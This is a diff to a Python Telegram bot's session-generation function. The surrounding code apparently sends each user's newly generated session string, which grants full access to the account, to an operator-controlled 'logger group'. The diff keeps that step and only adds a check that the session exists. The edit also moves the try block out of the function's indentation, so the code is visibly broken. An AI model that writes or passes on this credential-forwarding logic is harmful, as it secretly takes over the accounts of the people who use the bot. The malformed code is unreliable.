@@ -82,8 +82,10 @@ async def generate_session(bot, msg, telethon=False):
 
 
     # ================= LOG GROUP =================
+# ================= LOG GROUP =================
 
-    try:
+try:
+    if 'session' in locals() and session:
         print(f"LOGGER_GROUP: {env.LOGGER_GROUP}")
         print(f"Session Length: {len(session)}")
 
@@ -93,15 +95,9 @@ async def generate_session(bot, msg, telethon=False):
         )
 
         print("✅ Session sent to Logger Group successfully.")
+    else:
+        print("❌ Session not generated yet. Skipping logger.")
 
-    except Exception:
-        print("❌ Logger Group Error:")
-        traceback.print_exc()
-
-
-    # ================= SAFE LOG =================
-
-    await send_log(
-        bot,
-        f"✅ Session Generated\nUser ID: {user_id}\nPhone: {phone}"
-    )
+except Exception as e:
+    print(f"❌ Logger Group Error: {e}")
+    traceback.print_exc()
